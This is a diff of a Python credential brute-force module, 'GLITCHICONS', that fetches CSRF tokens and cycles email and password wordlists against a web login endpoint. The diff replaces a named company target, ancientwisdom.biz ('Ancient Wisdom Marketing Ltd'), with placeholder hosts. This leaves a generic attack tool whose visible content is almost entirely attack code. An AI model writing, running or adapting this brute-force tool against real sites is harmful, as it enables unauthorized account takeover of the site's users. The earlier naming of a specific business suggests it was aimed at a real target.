@@ -1,7 +1,7 @@
 """
 GLITCHICONS ⬡ — Brute Force Module
-Target: Ancient Wisdom Marketing Ltd
-Handles: CSRF token grabbing + rate-aware login brute force
+Target: [CLIENT]
+Generic CSRF-aware login brute force module
 """
 
 import requests
@@ -58,7 +58,7 @@ def try_login(session, login_url, email, password, csrf_token):
         "Accept": "application/json",
         "X-XSRF-TOKEN": csrf_token,
         "Referer": "https://v2.ancientwisdom.biz/app/login",
-        "Origin": "https://v2.ancientwisdom.biz",
+        "Origin": "https://target.example.com",
     }
     payload = {
         "email": email,
@@ -78,7 +78,7 @@ def try_login(session, login_url, email, password, csrf_token):
         return None
 
 def brute_force(
-    target="https://v2.ancientwisdom.biz",
+    target="https://target.example.com",
     email_file=None,
     password_file=None,
     single_email=None,
@@ -219,7 +219,7 @@ if __name__ == "__main__":
     warnings.filterwarnings("ignore")
 
     brute_force(
-        target="https://v2.ancientwisdom.biz",
+        target="https://target.example.com",
         email_file="wordlists/wholesale_emails.txt",
         password_file="wordlists/business_passwords.txt",
         delay=2.0,
